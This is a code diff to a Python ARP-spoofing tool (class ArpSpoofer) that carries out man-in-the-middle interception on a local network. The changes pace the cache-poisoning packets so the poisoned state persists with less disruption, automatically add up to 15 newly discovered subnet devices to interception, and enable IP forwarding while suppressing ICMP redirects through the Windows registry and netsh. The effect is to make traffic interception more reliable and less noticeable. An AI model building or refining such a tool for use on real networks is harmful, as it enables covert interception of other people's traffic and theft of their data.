@@ -393,6 +393,9 @@ class ArpSpoofer:
                         with self._lock:
                             self._packets_sent += 1
 
+                        # Micro-sleep between targets to prevent Wi-Fi channel burst congestion
+                        time.sleep(0.01)
+
                     except Exception as e:
                         print(f"[MITM] Spoof error for {target_ip}: {e}")
 
@@ -401,8 +404,8 @@ class ArpSpoofer:
                     self._refresh_targets()
                     self._last_refresh = time.time()
 
-                # Send every 2 seconds to keep ARP cache poisoned
-                for _ in range(20):  # 2 seconds in 0.1s increments
+                # Send every 3 seconds to maintain poisoned state without overwhelming the network
+                for _ in range(30):  # 3 seconds in 0.1s increments
                     if not self._running:
                         break
                     time.sleep(0.1)
@@ -426,7 +429,7 @@ class ArpSpoofer:
                     pass
 
     def _refresh_targets(self) -> None:
-        """Re-scan the subnet and add any new devices to the spoof list."""
+        """Re-scan the subnet and add newly discovered devices up to a safe concurrency cap."""
         try:
             from scapy.all import ARP, Ether, srp, conf
             conf.verb = 0
@@ -457,20 +460,20 @@ class ArpSpoofer:
                     ip = received.psrc
                     mac = received.hwsrc.upper()
 
-                    # Skip: self, gateway, already targeted
+                    # Skip: self, gateway
                     if ip == self._local_ip or ip == self._gateway_ip:
                         continue
-                    if ip in self._targets:
-                        continue
-
-                    self._targets[ip] = mac
-                    new_count += 1
 
                     # Update discovered hosts list
                     if not any(h["ip"] == ip for h in self._discovered_hosts):
                         self._discovered_hosts.append({
                             "ip": ip, "mac": mac, "hostname": "", "is_gateway": False
                         })
+
+                    # Add to active interception if under safe concurrency cap (max 15 devices)
+                    if ip not in self._targets and len(self._targets) < 15:
+                        self._targets[ip] = mac
+                        new_count += 1
 
             if new_count > 0:
                 print(f"[MITM] Auto-refresh: added {new_count} new device(s) to interception")
@@ -532,10 +535,17 @@ class ArpSpoofer:
             )
             self._forwarding_was_enabled = "forwarding" in result.stdout.lower() and "enabled" in result.stdout.lower()
 
-            # Enable via registry (most reliable on Windows)
+            # Enable IP routing and disable ICMP redirects in registry
+            # Suppressing ICMP redirects prevents Windows from flooding targets with
+            # redirect packets when forwarding across the same adapter interface.
             subprocess.run(
                 ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                  "/v", "IPEnableRouting", "/t", "REG_DWORD", "/d", "1", "/f"],
+                capture_output=True, timeout=10,
+            )
+            subprocess.run(
+                ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
+                 "/v", "EnableICMPRedirect", "/t", "REG_DWORD", "/d", "0", "/f"],
                 capture_output=True, timeout=10,
             )
 
@@ -544,14 +554,18 @@ class ArpSpoofer:
                 ["netsh", "interface", "ipv4", "set", "global", "forwarding=enabled"],
                 capture_output=True, timeout=10,
             )
+            subprocess.run(
+                ["netsh", "interface", "ipv4", "set", "global", "icmpredirects=disabled"],
+                capture_output=True, timeout=10,
+            )
 
-            print("[MITM] IP forwarding enabled (Windows)")
+            print("[MITM] IP forwarding enabled, ICMP redirects suppressed (Windows)")
 
         except Exception as e:
             print(f"[MITM] Warning: could not enable IP forwarding ({e})")
 
     def _disable_ip_forwarding(self) -> None:
-        """Disable IP forwarding (restore original state)."""
+        """Disable IP forwarding and restore default routing settings."""
         if self._forwarding_was_enabled:
             print("[MITM] IP forwarding was already enabled before MITM, leaving as-is")
             return
@@ -569,7 +583,16 @@ class ArpSpoofer:
                 capture_output=True, timeout=10,
             )
             subprocess.run(
+                ["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
+                 "/v", "EnableICMPRedirect", "/t", "REG_DWORD", "/d", "1", "/f"],
+                capture_output=True, timeout=10,
+            )
+            subprocess.run(
                 ["netsh", "interface", "ipv4", "set", "global", "forwarding=disabled"],
+                capture_output=True, timeout=10,
+            )
+            subprocess.run(
+                ["netsh", "interface", "ipv4", "set", "global", "icmpredirects=enabled"],
                 capture_output=True, timeout=10,
             )
             print("[MITM] IP forwarding disabled (Windows)")
